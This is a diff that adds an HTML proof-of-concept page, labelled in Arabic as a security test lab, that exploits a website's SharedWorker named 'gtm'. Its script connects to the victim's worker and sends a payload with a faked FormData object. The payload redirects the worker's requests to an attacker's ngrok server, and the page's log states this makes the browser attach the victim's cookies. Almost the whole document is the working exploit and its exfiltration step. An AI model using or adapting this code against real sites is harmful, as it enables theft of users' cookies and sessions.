@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>صفحة اختبار أمني - Exploiting SharedWorker</title>
+    <style>
+        body { font-family: sans-serif; background-color: #f4f4f4; padding: 20px; }
+        .log-box { background: #000; color: #0f0; padding: 15px; border-radius: 5px; height: 200px; overflow-y: scroll; }
+        .status { color: red; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>مختبر استغلال ثغرات الـ Worker</h1>
+    <p>الحالة: <span id="status" class="status">جاري البحث عن أهداف...</span></p>
+    
+    <div class="log-box" id="logs">
+        [+] جاري محاولة الاتصال بالـ SharedWorker الخاص بموقع الضحية...<br>
+    </div>
+
+    <script>
+        const logs = document.getElementById('logs');
+        const status = document.getElementById('status');
+
+        function addLog(msg) {
+            logs.innerHTML += `[+] ${msg}<br>`;
+        }
+
+        // 1. محاولة الوصول للـ Worker بالاسم الذي حدده الكود (gtm)
+        try {
+            // في البيئات الضعيفة أمنياً، يمكن الاتصال بالـ Worker عبر اسمه فقط
+            const attackerPort = new SharedWorker("", "gtm").port;
+
+            attackerPort.onmessage = function(event) {
+                addLog("استجابة مستلمة من الضحية: " + JSON.stringify(event.data));
+            };
+
+            attackerPort.start();
+            addLog("تم إنشاء قناة اتصال مع الـ Worker بنجاح.");
+            status.innerText = "متصل بالهدف!";
+
+            // 2. إرسال الحمولة الخبيثة (Payload)
+            // نجعل الـ Worker يظن أنه يرسل بيانات عادية، لكننا نوجهه لخادمنا
+            const payload = {
+                url: "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev", // خادم المهاجم لاستقبال البيانات
+                retryIntervals: [0],
+                data: {
+                    // تزييف كائن يمر من فحص isFormData
+                    append: function() {},
+                    toString: function() { return "[object FormData]"; }
+                }
+            };
+
+            addLog("جاري إرسال طلب تسريب البيانات (Exfiltration)...");
+            attackerPort.postMessage(payload);
+            addLog("تم إرسال الطلب. سيقوم المتصفح بإرفاق Cookies الضحية تلقائياً.");
+
+        } catch (error) {
+            addLog("خطأ: " + error.message);
+            status.innerText = "فشل الاتصال (محمي بواسطة المتصفح أو CSP)";
+        }
+    </script>
+</body>
+</html>
